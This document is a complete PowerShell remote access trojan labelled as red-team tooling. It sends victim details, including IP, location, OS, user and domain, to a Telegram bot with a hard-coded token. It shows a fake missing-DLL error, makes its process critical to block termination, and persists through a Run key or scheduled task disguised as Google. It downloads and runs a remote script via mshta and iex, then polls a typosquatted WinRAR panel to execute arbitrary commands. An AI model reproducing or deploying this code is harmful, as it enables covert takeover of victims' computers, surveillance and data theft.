#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║          _____                             _   _   _       _       ____  _             _                      ║
#║         | ____|_ __   ___ _ __ _   _ _ __ | |_| | | |_   _| |__   / ___|| |_ ___  __ _| | ___ _ __            ║
#║         |  _| | '_ \ / __| '__| | | | '_ \| __| |_| | | | | '_ \  \___ \| __/ _ \/ _` | |/ _ \ '__|           ║
#║         | |___| | | | (__| |  | |_| | |_) | |_|  _  | |_| | |_) |  ___) | ||  __/ (_| | |  __/ |              ║
#║         |_____|_| |_|\___|_|   \__, | .__/ \__|_| |_|\__,_|_.__/  |____/ \__\___|\__,_|_|\___|_|              ║
#║                                |___/|_|                                                                       ║
#║                                                                                                               ║
#║                                    Red Teaming and Offensive Security                                         ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
#
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║						   NO ERRORS                                                     ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$redExclamation = [char]0x203C
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║						   TG MESSAGE                                                    ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
function Send-TelegramMessage {
    param (
        [string]$message
    )

    $ErrorActionPreference = 'silentlycontinue'
    $Messaging = $message
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $compSystem = Get-WmiObject -Class Win32_ComputerSystem
    $domain = $null
    if ($compSystem.PartOfDomain) {
        $domain = "$($compSystem.Domain)"
    } else {
        Write-Output "Domain not found"
    }

    $botToken = "7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo" 
    $chatID = "-1002168553106" 
    $serverIP = "Server IP"
    $os = Get-WmiObject Win32_OperatingSystem
    $osVersion = $os.Caption
    $ipAddress = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq 'Ethernet' -and $_.AddressFamily -eq 'IPv4' }).IPAddress
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    $externalIP = $ipInfo.ip
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME

    #----------LOCATION----------
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    $location = $ipInfo.loc
    $city = $ipInfo.city
    $region = $ipInfo.region
    $country = $ipInfo.country

    if (-not (Test-Connection -ComputerName $serverIP -Count 1 -Quiet)) { 
        if($domain){
            $redExclamation = [char]0x203C
            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName `n$($redExclamation)Domain: <b>$domain</b>"
            $adminResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getChatAdministrators?chat_id=$chatID" -Method Get
            $admins = $adminResponse.result
            foreach ($admin in $admins) {
                $adminId = $admin.user.id
                $sendMessageParams = @{
                    chat_id = $adminId
                    text = $messageText
                    parse_mode = "HTML"
                }
                $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
                $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
                try {
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
                } catch {
                    Write-Output "Restricted"
                }
            }
        } else {
            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName"
            $sendMessageParams = @{
                chat_id = $chatID
                text = $messageText
                parse_mode = "HTML"
            }

            $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
            $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)

            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
        }
    }
}
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║						      MAIN                                                       ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

$SERVER_URL = "https://www.win-rar.co/panel/"

$message = "$($redExclamation) [RAT] Installed"
Send-TelegramMessage -message $message

$UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3

Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║						     SYSTEM                                                      ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
function SystemInfo {
    $IP = Invoke-RestMethod https://ident.me -UserAgent $UAG
    $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
    $INFO = Get-ComputerInfo
    $SYSTEM = @{
        uuid      = "$UID"
        public_ip = "$IP"
        info      = $INFO
    }
    return $SYSTEM 
}
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║						     CRYPT                                                       ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
function EncryptString {
    Param ([string]$inputStr)
    $inputBytes = [System.Text.Encoding]::UTF8.GetBytes($inputStr)
    $enc = [System.Text.Encoding]::UTF8

    $AES = New-Object System.Security.Cryptography.AESManaged
    $iv = "&9*zS7LY%ZN1thfI"
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
    $AES.IV = $enc.GetBytes($iv)
    $AES.Key = $enc.GetBytes("123456789012345678901234r0hollah")
    $encryptor = $AES.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.length)
    $output = [Convert]::ToBase64String($encryptedBytes)
    return $output
}

function DcryptString {
    Param ([string]$inputStr)
    $data = [Convert]::FromBase64String($inputStr)
    $iv = "&9*zS7LY%ZN1thfI"
    $key = "123456789012345678901234r0hollah".PadRight(16, [char]0)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $utf8 = [System.Text.Encoding]::Utf8
    $aes.Key = $utf8.GetBytes($key)
    $aes.IV = $utf8.GetBytes($iv)
    $dec = $aes.CreateDecryptor()
    $RESULT = $dec.TransformFinalBlock($data, 0, $data.Length)
    $RESULTStr = $utf8.GetString($RESULT)
    return $RESULTStr
    $dec.Dispose()
}
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║						    CRITICAL                                                     ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
function KDMUTEX {
    if ($fakeerror) {
        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
    }
    $AppId = "62088a7b-ae9f-4802-827a-6e9c666cb48e" #GUID
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if (-not $CreatedNew) {
		$message = "[RAT] [!] An instance of this script is already running."
		Send-TelegramMessage -message $message
        exit
    }
    [ProcessUtility]::MakeProcessCritical()
    Invoke-TASKS
}

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessUtility
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        RtlSetProcessIsCritical(1, 0, 0);
    }

    public static void MakeProcessKillable()
    {
        RtlSetProcessIsCritical(0, 0, 0);
    }
}
"@
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║						      MAIN                                                       ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
function Invoke-TASKS {
	if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
		$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
		$regName = "Google LLC Worker"
		$regValue = "mshta.exe vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://panel.ngrok.app/main/winrar/zakrep/invoker.ps1'|iex`",0)(window.close)"

		New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null

		$property = Get-ItemProperty -Path $regPath -Name $regName
		if ($property.$regName -eq $regValue) {
			$message = "$($redExclamation) [RAT] REG AutoRun success"
			Send-TelegramMessage -message $message
		} else {
			$message = "$($redExclamation) [RAT] REG AutoRun fail"
			Send-TelegramMessage -message $message
		}
	} else {
		$backName = "WorkerTask"
		$task = Get-ScheduledTask -TaskName $backName -ErrorAction SilentlyContinue
		if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
			Unregister-ScheduledTask -TaskName $backName -Confirm:$false
		}
		$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://panel.ngrok.app/main/winrar/zakrep/invoker.ps1'|iex`",0)(window.close)"
		$task_trigger = New-ScheduledTaskTrigger -AtLogOn
		$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
		Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $backName -Description "Google Chrome Protector" -RunLevel Highest -Force | Out-Null
		if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
			$message = "$($redExclamation) [RAT] TASK AutoRun success"
			Send-TelegramMessage -message $message
		} else {
			$message = "$($redExclamation) [RAT] TASK AutoRun fail"
			Send-TelegramMessage -message $message
		}
	}
	while ($true) {
    $SYSTEM = SystemInfo 
    $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
    $CRYPT = EncryptString  $JSON
    $PARAM = @{
        DATA     = $CRYPT
        new_user = "ok"
    }
    Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG

    while ($true) {
        $TIMER = Get-Random -SetSeed 300 -Maximum 700
        sleep -Milliseconds $TIMER
        $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
        $SYSTEM = @{
            uuid = "$UID"
        }
        $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
        $CRYPT = EncryptString  $JSON
        $PARAM = @{
            DATA = $CRYPT
        }
        $RESULT = Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM  -UserAgent $UAG
        $REQ = DcryptString($RESULT)
			if ($REQ -ne "wait") {
				$JSON = $REQ | ConvertFrom-Json
				foreach ($file in $JSON) {
					$MODE = $file.json
					$CMD_UID = $file.cmd_uid
					$CMD = $file.cmd
					if (Get-Job -Name $CMD_UID -ErrorAction SilentlyContinue) {
						if ((Get-Job -Name $CMD_UID -ErrorAction SilentlyContinue | Select-Object -ExpandProperty State) -eq "Completed" -or 
							(Get-Job -Name $CMD_UID -ErrorAction SilentlyContinue | Select-Object -ExpandProperty State) -eq "Failed") {
							$RUN = Receive-Job -Name $CMD_UID -ErrorAction SilentlyContinue
							if ($RUN -eq "" -or $RUN -eq $null) {
								$RUN = "No Result"
							}
							$SYSTEM = @{
								uuid    = "$UID"
								result  = "$RUN"
								cmd_uid = "$CMD_UID"
							}
							$JSON = $SYSTEM | ConvertTo-JSON -Depth 100
							$CRYPT = EncryptString $JSON
							$PARAM = @{
								DATA = $CRYPT
							}
							Invoke-RestMethod -Method 'Post' -Uri $SERVER_URL -Body $PARAM -UserAgent $UAG
						}
					} else {
						$SB = [scriptblock]::Create("iex '$CMD | Out-String'")
						$JOB = Start-Job -ScriptBlock $SB -Name $CMD_UID -ErrorAction SilentlyContinue
					}
				} 
			}
		}
	}
}
KDMUTEX
